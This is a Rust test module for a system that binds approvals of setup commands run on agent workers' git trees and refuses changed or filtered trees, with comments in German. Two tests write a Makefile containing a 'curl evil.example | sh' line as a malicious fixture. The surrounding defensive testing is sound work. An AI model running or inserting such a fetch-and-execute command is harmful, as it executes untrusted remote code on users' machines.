        let current = grant_for_tree(&repo, &repo, &changed, "npm ci").expect("grant");
        assert!(matches!(
            trust_status(Some(&grant), &current),
            TrustStatus::Mismatch
        ));
    }

    /// Review-F4-r13 (k3 Befund 2): ein Verzeichnis namens `package.json`
    /// darf die Eingangs-Prüfung nicht bestehen. Auf git 2.55 liefert
    /// `ls-tree <tree> -- package.json` dafür den Tree-Eintrag (gemessen) —
    /// ältere Gits listeten die Kinder, deren erste Zeile `100644 blob` sein
    /// kann. Der Test pinnt den strikten, versionsunabhängigen Vertrag:
    /// genau eine Blob-Zeile für genau diesen Namen, sonst Verweigerung.
    #[test]
    fn a_directory_named_like_a_declared_input_is_refused() {
        let dir = TempDir::new("setup-dir-input");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        fs::create_dir_all(repo.join("package.json")).expect("mkdir");
        std::fs::write(repo.join("package.json").join("x.json"), "{}\n").expect("write");
        git(&["add", "package.json/x.json"]);
        git(&["commit", "--no-gpg-sign", "-m", "directory input"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let err = candidate_inputs(&repo, &code)
            .expect_err("a directory named like a declared input must be refused");
        assert!(
            err.contains("directory"),
            "the refusal names the cause: {err}"
        );
    }

    /// Review-F4-r14 (Sonnet Befund 4): ein als ausführbar (100755)
    /// committetes Lifecycle-Script ist ein legitimer deklarierter Input —
    /// der strikte Match-Arm lässt es durch. Alle anderen Eingangs-Tests
    /// pinnen nur Ablehnungspfade; dieser Test verhindert, dass eine
    /// künftige Verschärfung 100755 stillschweigend aussperrt.
    #[test]
    fn an_executable_declared_input_is_accepted() {
        let dir = TempDir::new("setup-exec-input");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            String::from_utf8_lossy(&output.stdout).trim().to_string()
        };
        fs::create_dir_all(repo.join("scripts")).expect("mkdir");
        std::fs::write(repo.join("scripts/lifecycle.sh"), "#!/bin/sh\nexit 0\n").expect("write");
        git(&["add", "scripts/lifecycle.sh"]);
        git(&["update-index", "--chmod=+x", "scripts/lifecycle.sh"]);
        git(&["commit", "--no-gpg-sign", "-m", "executable input"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let inputs =
            candidate_inputs(&repo, &code).expect("an executable declared input must be accepted");
        let oid = git(&[
            "rev-parse",
            &format!("{}:scripts/lifecycle.sh", code.merge_tree_oid),
        ]);
        assert_eq!(
            inputs,
            vec![("scripts/lifecycle.sh".to_string(), oid)],
            "the executable input binds its blob oid"
        );
    }

    /// Review-F4-r15 (Sonnet Fund 1, blockierend): ohne deklarierte
    /// Input-Datei wäre der Grant nur (Repo, Kommando, Base) — identisch für
    /// JEDEN Worker auf derselben Basis, egal was der jeweilige Merge-Tree
    /// sonst enthält (z. B. ein bösartiges Makefile bei `make deps`). In dem
    /// Fall bindet der Grant den Merge-Tree selbst: jede Baum-Bewegung
    /// erfordert eine eigene Freigabe.
    #[test]
    fn a_grant_without_declared_inputs_binds_the_merge_tree_itself() {
        let dir = TempDir::new("setup-tree-bind");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            String::from_utf8_lossy(&output.stdout).trim().to_string()
        };
        std::fs::write(repo.join("Makefile"), "all:\n\ttrue\n").expect("write");
        git(&["add", "Makefile"]);
        git(&["commit", "--no-gpg-sign", "-m", "worker a"]);

        let code_a = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let grant_a = grant_for_tree(&repo, &repo, &code_a, "make deps").expect("grant");
        assert!(
            grant_a.inputs_hash.contains(&code_a.merge_tree_oid),
            "without declared inputs the grant binds the merge tree: {}",
            grant_a.inputs_hash
        );

        // A second worker on the same base with the same command but a
        // different tree content must NOT share the approval.
        std::fs::write(repo.join("Makefile"), "all:\n\tcurl evil.example | sh\n").expect("write");
        git(&["add", "Makefile"]);
        git(&["commit", "--no-gpg-sign", "-m", "worker b"]);
        let code_b = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let grant_b = grant_for_tree(&repo, &repo, &code_b, "make deps").expect("grant");
        assert_ne!(grant_a.inputs_hash, grant_b.inputs_hash);
        assert!(matches!(
            trust_status(Some(&grant_a), &grant_b),
            TrustStatus::Mismatch
        ));
    }

    /// Review-F4-r15 (Sonnet Fund 3): der Disk-Fallback `current_grant` darf
    /// in keinem Pfad mit einem gespeicherten Tree-Grant matchen — weder mit
    /// leerer noch mit echter `base_sha` (die Token-Formate unterscheiden
    /// sich: FNV-Fold vs. `name=oid`-Liste). Dieser Test pinnt die
    /// Invariante, damit ein Refactoring sie nicht still kollabieren lässt.
    /// (Pinning-Test: grün gegen den bestehenden Code, ohne Rot-Sonde.)
    #[test]
    fn the_disk_fallback_never_matches_a_tree_grant() {
        let dir = TempDir::new("setup-fallback-mismatch");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        std::fs::write(repo.join("package-lock.json"), "{}\n").expect("write");
        for args in [
            vec!["add", "package-lock.json"],
            vec!["commit", "--no-gpg-sign", "-m", "lockfile"],
        ] {
            let out = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(&args)
                .output()
                .expect("run git");
            assert!(
                out.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&out.stderr)
            );
        }
        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let stored = grant_for_tree(&repo, &repo, &code, "npm ci").expect("grant");

        // No candidate measurable: empty base_sha.
        let no_code = current_grant(&repo, "npm ci", "");
        // Candidate measurable but no setup command: real base_sha.
        let no_command = current_grant(&repo, "npm ci", &code.base_tip_sha);
        for fallback in [&no_code, &no_command] {
            assert!(
                matches!(trust_status(Some(&stored), fallback), TrustStatus::Mismatch),
                "the disk fallback must never match a stored tree grant: {fallback:?}"
            );
        }
    }

    /// Review-F4-r16 (Opus Fund 1, blockierend): der Grant autorisiert die
    /// Ausführung von ALLEM, was das Setup-Kommando im Baum anfasst — nicht
    /// nur die deklarierten Inputs (`npm ci` führt Lifecycle-Scripts aus,
    /// `make deps` liest das Makefile). Zwei Kandidaten mit identischem
    /// Lockfile, aber geändertem nicht-deklariertem File müssen verschiedene
    /// Grants haben — sonst läuft nie angesehener Agent-Code unter der
    /// Freigabe eines anderen Workers.
    #[test]
    fn a_grant_does_not_cover_a_candidate_that_changed_only_unbound_files() {
        let dir = TempDir::new("setup-unbound-files");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            String::from_utf8_lossy(&output.stdout).trim().to_string()
        };
        std::fs::write(repo.join("package-lock.json"), "{}\n").expect("write");
        std::fs::write(repo.join("Makefile"), "all:\n\ttrue\n").expect("write");
        git(&["add", "package-lock.json", "Makefile"]);
        git(&["commit", "--no-gpg-sign", "-m", "worker a"]);

        let code_a = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let grant_a = grant_for_tree(&repo, &repo, &code_a, "make deps").expect("grant");

        // Same base, same command, same declared inputs — only an UNBOUND
        // file changed. The approval must not carry over.
        std::fs::write(repo.join("Makefile"), "all:\n\tcurl evil.example | sh\n").expect("write");
        git(&["add", "Makefile"]);
        git(&["commit", "--no-gpg-sign", "-m", "worker b"]);
        let code_b = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let grant_b = grant_for_tree(&repo, &repo, &code_b, "make deps").expect("grant");
        assert_ne!(grant_a.inputs_hash, grant_b.inputs_hash);
        assert!(matches!(
            trust_status(Some(&grant_a), &grant_b),
            TrustStatus::Mismatch
        ));
    }

    /// Review-F4-r17 (Opus Fund 3): eine Listing-Zeile, die keinen
    /// deklarierten Namen exakt trifft, ist per Konstruktion eine
    /// Verzeichnis-Expansion oder Anomalie — `core.quotePath` C-quotet
    /// Kinder mit Nicht-ASCII-Bytes, sodass selbst ein `name/`-Prefix-Check
    /// sie nicht fängt. Verweigern, nie verwerfen.
    #[test]
    fn an_unknown_listing_line_is_refused() {
        let err = parse_input_listing(
            "100644 blob 0967ef424bce6791893e9a57bb952f80fd536e93\t\"package.json/\\303\\244.json\"",
        )
        .expect_err("a quoted directory child must be refused");
        assert!(err.contains("unexpected entry"), "{err}");
    }

    /// Review-F4-r19 (Opus Fund 3): ein `check-attr`, das mit Exit 0 weniger
    /// liefert als erwartet (oder Zeilen fremder Form), darf nicht als „kein
    /// Attribut gesetzt" durchgehen — sonst fällt genau die Smudge-Situation
    /// der r5/r6/r11/r12-Refusals lautlos weg.
    #[test]
    fn an_incomplete_attr_listing_is_refused() {
        let names = ["package.json", "package-lock.json"];
        let full = |lock_filter: &str| {
            format!(
                "package.json: filter: unspecified\n\
                 package.json: ident: unspecified\n\
                 package.json: working-tree-encoding: unspecified\n\
                 package.json: eol: unspecified\n\
                 package-lock.json: filter: {lock_filter}\n\
                 package-lock.json: ident: unspecified\n\
                 package-lock.json: working-tree-encoding: unspecified\n\
                 package-lock.json: eol: unspecified"
            )
        };
        check_attr_listing(&names, &full("unspecified")).expect("complete and clean");
        // `unset` (a `-filter` entry in .gitattributes) switches the
        // attribute OFF — the safest possible answer, not a refusal
        // (review-F4-r20, Opus Fund 2).
        check_attr_listing(&names, &full("unset"))
            .expect("unset means the attribute is off, not transforming");
        let err = check_attr_listing(&names, "package.json: filter: unspecified")
            .expect_err("a truncated listing must be refused");
        assert!(err.contains("cannot inspect"), "{err}");
        let err = check_attr_listing(&names, "package.json: unknown-attr: unspecified")
            .expect_err("an unexpected attribute name must be refused");
        assert!(err.contains("cannot inspect"), "{err}");
        let err = check_attr_listing(&names, &full("lfs")).expect_err("a set filter is refused");
        assert!(err.contains("filter"), "{err}");
        assert!(err.contains("package-lock.json"), "{err}");
    }

    /// Review-F4-r23 (k3 Fund 2 / Opus Fund 2): Messung und Checkout müssen
    /// dieselbe Attribut-Quellenmenge sehen. Eine repo-lokal gesetzte
    /// `core.attributesFile` (Maschinen-Datei) darf den Sweep nicht treffen —
    /// der Kandidaten-Checkout ignoriert sie per Pin, die Messung muss es
    /// genauso halten, sonst ist jedes Repo auf so einer Maschine dauerhaft
    /// verweigert.
    #[test]
    fn a_machine_scoped_attributes_file_does_not_veto_the_candidate() {
        let dir = TempDir::new("setup-global-attrs");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        std::fs::write(repo.join("package-lock.json"), "{}\n").expect("write");
        git(&["add", "package-lock.json"]);
        git(&["commit", "--no-gpg-sign", "-m", "lockfile"]);
        // A machine-scoped attributes file (pointed to from the repo config)
        // that would refuse everything it touched.
        let global = dir.path().join("machine-attrs");
        std::fs::write(&global, "* filter=lfs\n").expect("write machine attrs");
        git(&["config", "core.attributesFile", &global.to_string_lossy()]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        candidate_inputs(&repo, &code)
            .expect("machine-scoped attributes must not veto the candidate");
        refuse_transforming_tree_attrs(&repo, &code.merge_tree_oid)
            .expect("machine-scoped attributes must not veto the tree sweep");
    }

    /// Review-F4-r21 (Opus Fund 2, blockierend): die Attribut-Prüfung deckte
    /// nur TRUST_INPUTS — ausgeführt wird aber der GANZE Baum. Ein
    /// `scripts/* filter=lfs` des Agenten (Pointer im Diff, Smudge beim
    /// Kandidaten-Checkout) lieferte Bytes, die niemand sah, und `validate`
    /// bliebe stumm (Clean-Filter macht den Worktree wieder identisch).
    /// Jetzt: Sweep über jeden Pfad des Baums.
    #[test]
    fn a_filter_anywhere_in_the_tree_is_refused() {
        let dir = TempDir::new("setup-tree-filter");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        fs::create_dir_all(repo.join("scripts")).expect("mkdir");
        std::fs::write(repo.join("scripts/build.sh"), "#!/bin/sh\nexit 0\n").expect("write");
        // A non-ASCII, space-carrying path pins the `-z` parsing: a return to
        // line-based reading would misparse it (C-quoting) and either refuse
        // wrongly or pass silently (review-F4-r22, Opus B3).
        std::fs::write(repo.join("scripts/ä b.sh"), "pointer\n").expect("write");
        std::fs::write(repo.join("package-lock.json"), "{}\n").expect("write");
        std::fs::write(repo.join(".gitattributes"), "scripts/* filter=lfs\n")
            .expect("write attributes");
        git(&["add", "."]);
        git(&["commit", "--no-gpg-sign", "-m", "filtered tree"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let err = refuse_transforming_tree_attrs(&repo, &code.merge_tree_oid)
            .expect_err("a filter ANYWHERE in the tree must be refused — the whole tree runs");
        assert!(
            err.contains("scripts/build.sh"),
            "the refusal names the file: {err}"
        );
        assert!(err.contains("filter"), "the refusal names the cause: {err}");
    }

    /// Review-F4-r21 (Opus Fund 1, blockierend): das verbreitete Idiom
    /// `* text=auto eol=lf` liefert `eol: lf` — und git konvertiert beim
    /// Checkout NUR LF→CRLF, niemals LF→LF. `eol=lf` erzeugt also exakt die
    /// Blob-Bytes und darf nicht als transformierend verweigert werden,
    /// sonst ist Setup-Trust für solche Repos dauerhaft tot.
    #[test]
    fn an_lf_pinned_declared_input_is_accepted() {
        let dir = TempDir::new("setup-eol-lf");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        std::fs::write(repo.join("package-lock.json"), "{}\n").expect("write");
        std::fs::write(repo.join(".gitattributes"), "* text=auto eol=lf\n")
            .expect("write attributes");
        git(&["add", "package-lock.json", ".gitattributes"]);
        git(&["commit", "--no-gpg-sign", "-m", "lf-pinned input"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        candidate_inputs(&repo, &code)
            .expect("eol=lf never transforms (git only converts LF→CRLF); it must be accepted");
    }

    /// Review-F4-r17 (Opus Fund 2): Mehrdatei-Pfad — das Attribut der
    /// ZWEITEN Datei muss die Verweigerung auslösen, mit benannter Ursache.
    /// Eine „nur die erste Zeile"-Optimierung würde das lautlos aushebeln.
    #[test]
    fn a_filtered_second_input_is_refused_with_its_cause() {
        let dir = TempDir::new("setup-filter-second");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        std::fs::write(repo.join("package.json"), "{}\n").expect("write");
        std::fs::write(repo.join("package-lock.json"), "pointer\n").expect("write");
        std::fs::write(
            repo.join(".gitattributes"),
            "package-lock.json filter=lfs\n",
        )
        .expect("write attributes");
        git(&["add", "package.json", "package-lock.json", ".gitattributes"]);
        git(&["commit", "--no-gpg-sign", "-m", "two inputs, one filtered"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let err = candidate_inputs(&repo, &code)
            .expect_err("a filtered second declared input must be refused");
        assert!(err.contains("filter"), "the refusal names the cause: {err}");
        assert!(
            err.contains("package-lock.json"),
            "the refusal names the file: {err}"
        );
    }

    /// Review-F4-r17 (Opus Fund 2): zwei saubere Inputs — der Token enthält
    /// beide `name=oid`-Zeilen sortiert plus die `tree=`-Zeile. (Pinning:
    /// grün gegen bestehenden Code, keine Rot-Sonde.)
    #[test]
    fn two_clean_inputs_bind_both_oids_sorted() {
        let dir = TempDir::new("setup-two-inputs");
        let repo = crate::testutil::init_repo(&dir.path().join("repo"));
        let git = |args: &[&str]| {
            let output = crate::proc::command("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .expect("run git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            String::from_utf8_lossy(&output.stdout).trim().to_string()
        };
        std::fs::write(repo.join("package.json"), "{}\n").expect("write");
        std::fs::write(repo.join("package-lock.json"), "{}\n").expect("write");
        git(&["add", "package.json", "package-lock.json"]);
        git(&["commit", "--no-gpg-sign", "-m", "two inputs"]);

        let code = crate::readiness::measure_code(&repo, "main", "HEAD").expect("tuple");
        let grant = grant_for_tree(&repo, &repo, &code, "npm ci").expect("grant");
        let oid_lock = git(&[
            "rev-parse",
            &format!("{}:package-lock.json", code.merge_tree_oid),
        ]);
        let oid_pkg = git(&[
            "rev-parse",
            &format!("{}:package.json", code.merge_tree_oid),
        ]);
        assert_eq!(
            grant.inputs_hash,
            format!(
                "package-lock.json={oid_lock}\npackage.json={oid_pkg}\ntree={}",
                code.merge_tree_oid
            )
        );
    }

    /// Review-F4-r18 (Opus Fund 2 / k3 Beobachtung): das Record-Verzeichnis
    /// wird von ALLEN Workern geteilt — der Prune eines Workers darf das
    /// aktuelle Paar eines anderen nie treffen, und der Voll-Sweep beim
    /// Worker-Abbau muss genau diesen Worker treffen. (Pinning: grün gegen
    /// bestehenden Code.)
    #[test]
    fn a_prune_keeps_the_other_workers_records() {
        let dir = TempDir::new("setup-prune-shared");
        let root = dir.path().join(".projecta-setup");
        fs::create_dir_all(&root).unwrap();
        let a = crate::readiness::acceptance_hash("wk-a");
        let b = crate::readiness::acceptance_hash("wk-b");
        for name in [
            format!("{a}-cmd-old.json"),
            format!("{a}-cmd-old.log"),
            format!("{a}-cmd-new.json"),
            format!("{a}-cmd-new.log"),
            format!("{b}-cmd-cur.json"),
            format!("{b}-cmd-cur.log"),
        ] {
            fs::write(root.join(&name), b"x").unwrap();
        }

        let record = root.join(format!("{a}-cmd-new.json"));
        prune_candidate_runs(&record, &a);
        assert!(!root.join(format!("{a}-cmd-old.json")).exists());
        assert!(!root.join(format!("{a}-cmd-old.log")).exists());
        assert!(root.join(format!("{a}-cmd-new.json")).exists());
        assert!(root.join(format!("{a}-cmd-new.log")).exists());
        assert!(
            root.join(format!("{b}-cmd-cur.json")).exists(),
            "another worker's record survives a prune"
        );
        assert!(root.join(format!("{b}-cmd-cur.log")).exists());

        // The full sweep when worker B is torn down hits exactly B's files.
        let b_checkout = dir.path().join("wk-b-checkout");
        prune_worker_runs(&b_checkout, "wk-b");
        assert!(!root.join(format!("{b}-cmd-cur.json")).exists());
        assert!(!root.join(format!("{b}-cmd-cur.log")).exists());
        assert!(
            root.join(format!("{a}-cmd-new.json")).exists(),
            "the other worker's pair survives the teardown sweep"
        );
    }

    /// Review-F4-r12-Fund 2: der Last-Run-Record hängt am Kommando — eine
    /// Kommando-Korrektur auf unverändertem Baum darf das alte Ergebnis nicht
    /// als das neue anzeigen.
    #[test]
    fn the_candidate_run_record_is_bound_to_the_command() {
        let dir = TempDir::new("setup-record-key");
        let code = crate::readiness::CodeTuple {
            worker_head_sha: "a".into(),
            base_tip_sha: "b".into(),
            merge_tree_oid: "c".into(),
        };
        let first = candidate_run_path(dir.path(), "wk-1", &code, Some("npm ci"));
        let second = candidate_run_path(dir.path(), "wk-1", &code, Some("npm ci && npm run build"));
        assert_ne!(first, second, "a changed command gets its own record");
    }

    fn grant_for(dir: &Path, command: &str) -> TrustGrant {
        current_grant(dir, command, "base-aaa")
    }

    #[test]
    fn missing_grant_does_not_spawn() {
        let dir = TempDir::new("setup-no-grant");
        let cwd = dir.path();
        let current = grant_for(cwd, "exit 0");
        let log = cwd.join("setup.log");
        let record = last_run_path(cwd, "pj-1");
        let err = run_if_trusted(
            "exit 0",
            cwd,
            None,
            &current,
            &log,
            &record,
            Duration::from_secs(2),
        )
        .expect_err("untrusted");
        assert_eq!(err, TrustStatus::Missing);
        assert!(!log.exists(), "no spawn means no log");
        assert!(read_last_run(&record).is_none());
    }

    #[test]
    fn unchanged_command_with_changed_lifecycle_script_reasks_trust() {
        let dir = TempDir::new("setup-script");
        let cwd = dir.path();
        fs::create_dir_all(cwd.join("scripts")).unwrap();
        fs::write(cwd.join("scripts/lifecycle.cmd"), b"old").unwrap();
        fs::write(cwd.join("scripts/lifecycle.sh"), b"old").unwrap();
        let command = "echo setup";
        let granted = grant_for(cwd, command);
        fs::write(cwd.join("scripts/lifecycle.cmd"), b"new").unwrap();
        fs::write(cwd.join("scripts/lifecycle.sh"), b"new").unwrap();
        let current = grant_for(cwd, command);
        assert_eq!(granted.command_normalized, current.command_normalized);
        assert_ne!(granted.inputs_hash, current.inputs_hash);
        let log = cwd.join("setup.log");
        let err = run_if_trusted(
            command,
            cwd,
            Some(&granted),
            &current,
            &log,
            &last_run_path(cwd, "pj-1"),
            Duration::from_secs(2),
        )
        .expect_err("mismatch");
        assert_eq!(err, TrustStatus::Mismatch);
        assert!(!log.exists());
    }

    #[test]
    fn matching_grant_runs_and_writes_a_log() {
        let dir = TempDir::new("setup-ok");
        let cwd = dir.path();
        let command = "echo ok";
        let current = grant_for(cwd, command);
        let log = cwd.join("setup.log");
        let record = last_run_path(cwd, "pj-ok");
        let run = run_if_trusted(
            command,
            cwd,
            Some(&current),
            &current,
            &log,
            &record,
            Duration::from_secs(10),
        )
        .expect("trusted");
        assert!(run.ok, "{run:?}");
        assert!(!run.timed_out);
        assert!(log.exists());
        let body = fs::read_to_string(&log).unwrap();
        assert!(body.to_lowercase().contains("ok"), "{body}");
        let stored = read_last_run(&record).expect("last run");
        assert!(stored.ok);
        assert_eq!(stored.inputs_hash, current.inputs_hash);
    }

    /// Review-F4-r13 (Sonnet Fund 1): der Reap-Beleg existierte nur für das
    /// Testkommando (testgate `children_of_a_successful_run_are_dead_before_cleanup`),
    /// nicht für den Setup-Pfad. Auch hier gilt: Kinder eines erfolgreichen
    /// Laufs sind mit dem Prozessbaum tot, bevor `run_if_trusted` zurückkehrt —
    /// ein Überlebender würde seinen Marker nach dem Gate schreiben.
    #[test]
    fn children_of_a_trusted_setup_run_are_dead_before_cleanup() {
        // Without node the spawned child never exists and this test would
        // pass vacuously — fail loudly instead (Muster: testgate, r12).
        let node = crate::proc::command("node")
            .arg("--version")
            .output()
            .expect("node probe");
        assert!(node.status.success(), "this test needs node in PATH");
        let dir = TempDir::new("setup-reap");
        let cwd = dir.path();
        let marker = cwd.join("child-survived.txt");
        let child_js = cwd.join("child.js");
        fs::write(
            &child_js,
            format!(
                "setTimeout(()=>require('fs').writeFileSync({:?},'x'),2500)",
                marker.to_string_lossy()
            ),
        )
        .expect("write child script");
        let command = if cfg!(windows) {
            format!("start \"\" /b node \"{}\"", child_js.to_string_lossy())
        } else {
            format!("node \"{}\" &", child_js.to_string_lossy())
        };
        let current = grant_for(cwd, &command);
        let log = cwd.join("setup.log");
        let record = last_run_path(cwd, "pj-reap");
        let run = run_if_trusted(
            &command,
            cwd,
            Some(&current),
            &current,
            &log,
            &record,
            Duration::from_secs(10),
        )
        .expect("trusted");
        assert!(run.ok, "{run:?}");
        // Marker-Timer 2500 ms; 5000 ms Marge auch unter Last (r15, Sonnet Fund 5).
        thread::sleep(Duration::from_millis(5000));
        assert!(
            !marker.exists(),
            "the setup run's background child must be reaped with the process tree"
        );
    }

    #[cfg(windows)]
    #[test]
    fn a_timeout_takes_the_whole_process_tree_with_it() {
        let dir = TempDir::new("setup-tree");
        let cwd = dir.path().join("run");
        fs::create_dir_all(&cwd).unwrap();
        let command = "start /B cmd /C ping -n 20 127.0.0.1 > held.txt & ping -n 20 127.0.0.1";
        let current = grant_for(&cwd, command);
        let log = cwd.join("setup.log");
        let record = last_run_path(&cwd, "pj-tree");
        let run = run_if_trusted(
            command,
            &cwd,
            Some(&current),
            &current,
            &log,
            &record,
            Duration::from_secs(1),
        )
        .expect("trusted");
        assert!(run.timed_out);
        assert!(!run.ok);
        let body = fs::read_to_string(&log).unwrap();
        assert!(body.contains(TIMEOUT_MARKER), "{body}");

        let deadline = Instant::now() + Duration::from_secs(3);
        let mut last = fs::remove_dir_all(&cwd);
        while last.is_err() && Instant::now() < deadline {
            thread::sleep(Duration::from_millis(100));
            last = fs::remove_dir_all(&cwd);
        }
        assert!(
            last.is_ok(),
            "a descendant is still holding the worktree: {last:?}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_timeout_takes_the_whole_process_group_with_it() {
        let dir = TempDir::new("setup-tree");
        let cwd = dir.path();
        let command = "sleep 20 & echo pid=$! ; sleep 20";
        let current = grant_for(cwd, command);
        let log = cwd.join("setup.log");
        let record = last_run_path(cwd, "pj-tree");
        let run = run_if_trusted(
            command,
            cwd,
            Some(&current),
            &current,
            &log,
            &record,
            Duration::from_secs(1),
        )
        .expect("trusted");
        assert!(run.timed_out);
        let body = fs::read_to_string(&log).unwrap();
        let pid = body
            .lines()
            .find_map(|line| line.trim().strip_prefix("pid="))
            .expect("pid");
        // Siehe testgate.rs: der Gruppen-Kill ist asynchron, und `await_drains`
        // kehrt beim EOF der Pipe zurueck - also bevor der Job den Zustand Z
        // erreicht. Ohne diese Schleife 4 von 40 Laeufen rot unter Last.
        let deadline = Instant::now() + Duration::from_secs(3);
        while process_is_alive(pid) && Instant::now() < deadline {
            thread::sleep(Duration::from_millis(20));
        }
        assert!(
            !process_is_alive(pid),
            "background job {pid} survived the timeout"
        );
    }

    /// The state character from `/proc/<pid>/stat`. The command name sits in
    /// parentheses and may itself contain spaces and parentheses, so the
    /// fields are read after the *last* `)`.
    #[cfg(unix)]
    fn proc_state(pid: &str) -> Option<char> {
        let stat = fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
        stat.rsplit_once(')')?.1.trim_start().chars().next()
    }

    /// Is the process behind this pid actually running? `kill -0` cannot tell
    /// a running process from a zombie - a process that exited but was never
    /// reaped keeps its pid slot, and `kill -0` answers yes for it. Containers
    /// without a reaping init keep zombies for the whole run, which made the
    /// sibling test in `testgate.rs` red in 7 of 10 Linux runs (gemessen
    /// 03.09.2026). `/proc/<pid>/stat` separates the two cases; on a unix
    /// without `/proc` the coarse question stays as a documented fallback.
    #[cfg(unix)]
    fn process_is_alive(pid: &str) -> bool {
        if !std::path::Path::new("/proc").is_dir() {
            return Command::new("kill")
                .args(["-0", pid])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .status()
                .map(|s| s.success())
                .unwrap_or(false);
        }
        proc_state(pid).is_some_and(|state| state != 'Z')
    }
}
